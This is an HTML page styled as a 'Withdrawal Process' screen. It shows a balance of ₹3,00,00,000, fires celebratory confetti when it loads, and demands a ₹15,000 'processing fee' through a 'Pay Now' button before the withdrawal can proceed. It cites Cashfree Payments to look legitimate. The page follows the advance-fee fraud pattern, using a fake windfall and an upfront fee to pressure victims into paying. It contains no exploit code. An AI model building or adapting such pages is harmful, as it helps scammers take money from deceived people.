<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Withdrawal Process</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        h1 {
            margin-bottom: 10px;
        }
        .amount {
            color: green;
            font-size: 30px;
            margin-bottom: 20px;
        }
        p {
            margin: 10px 0;
            font-size: 16px;
        }
        .important {
            color: red;
            font-weight: bold;
        }
        .pay-button {
            background-color: green;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
        }
        .payment-info {
            margin-top: 10px;
            font-size: 12px;
            color: grey;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Withdrawal Process</h1>
    <div class="amount">₹3,00,00,000</div>
    <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
    <p class="important">Your withdrawal will be processed only after successful payment.</p>

    <button class="pay-button">Pay Now ₹15,000</button>
    <div class="payment-info">
        Payment will be processed securely via Cashfree Payments
    </div>
</div>

<!-- Confetti JS -->
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
<script>
    // Confetti on page load
    window.onload = function() {
        confetti({
            particleCount: 150,
            spread: 100,
            origin: { y: 0.6 }
        });
    };
</script>

</body>
</html>
